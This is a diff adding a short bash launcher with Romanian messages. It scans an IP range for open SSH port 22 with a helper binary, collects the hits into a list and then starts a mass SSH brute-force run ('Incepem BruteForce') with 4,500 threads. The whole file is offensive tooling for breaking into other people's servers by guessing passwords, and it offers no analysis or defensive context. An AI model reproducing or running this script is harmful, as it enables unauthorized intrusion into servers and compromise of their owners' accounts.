@@ -1,0 +1,8 @@
+#!/bin/bash
+rm -rf bios.txt ips.lst
+././ps2 $1 22
+sort bios.txt | uniq > ips.lst
+kmko=`grep -c . ips.lst`
+echo "${red}Avem ${green}$kmko ip-uri. Incepem BruteForce${reset}"
+sleep 10
+./pg 4500 22 normal PRG-oldTeam
